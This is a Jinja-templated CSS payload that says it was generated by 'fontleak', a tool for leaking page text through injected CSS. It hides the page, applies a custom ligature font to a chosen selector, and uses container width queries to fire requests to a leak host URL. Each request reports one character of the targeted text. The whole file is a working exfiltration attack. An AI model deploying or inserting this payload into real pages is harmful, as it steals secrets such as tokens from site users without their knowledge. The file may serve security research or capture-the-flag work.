/* 
    This file was dynamically generated by fontleak (https://github.com/adrgs/fontleak)
*/
{% if step == 0 %}
* {
    display: none !important;
}

html, body, head {
    padding: 0!important;
    margin: 0!important;
    width: 0!important;
    height: 0!important;
    border: 0!important;
    outline: 0!important;
    line-height: 0!important;
    position: relative !important;
}

html {
    top: 0 !important;
    left: 0 !important;
    display: grid !important;
    grid-template-columns: 1fr auto;
    width: {{ html_width }}px !important;
    will-change: content, transform !important;
}

head {
    display: block !important;
    container-type: size !important;
    container-name: leak;
    height: 100% !important;
    width: 100% !important;
    max-width: {{ html_width }}px !important;
    background: blue !important;
}

/* Set up the head::before for reporting */
head::before {
    display: block !important;
    width: 0px !important;
    height: 0px !important;
    position: absolute !important;
    top: 0 !important;
    left: 0 !important;
    content: "";
}

body {
    display: block !important;
    width: auto !important;
    height: auto !important;
    position: static !important;
}

/* Target element styling */
{{ leak_selector }} {
    display: inline-block !important;
    font-family: 'fontleak' !important;
    font-size: 1000px !important;
    width: fit-content !important;
    overflow: hidden !important;
    white-space: normal !important;
    letter-spacing: 0 !important;
    line-height: 3px !important;
    font-feature-settings: "rlig" on, "liga" on, "calt" on, "dlig" on !important;
    text-rendering: optimizeLegibility !important;
    -webkit-font-feature-settings: "rlig", "liga", "calt", "dlig" !important;
    font-variant-ligatures: discretionary-ligatures !important;
    background: skyblue !important;
    will-change: content, transform !important;
    position: relative !important;
}


@font-face {
    font-family: 'fontleak';
    src: url('{{ font_path }}') format('opentype');
}
{% endif %}

{% for container in width_containers %}
@container leak (width: {{ container.width }}px) {
    head::before {
        content: url({{ host_leak }}/l?s={{ step }}&idx={{ container.char_idx }}&id={{ id }});
    }
}
{% endfor %}

/* Add the ::before pseudo-element with variable-based content */
{{ leak_selector }}::before {
    margin: 0 !important;
    padding: 0 !important;
    font-family: 'fontleak' !important;
    font-size: 1000px !important;
    white-space: pre-line !important;
    content: "{{ step_char }}";
}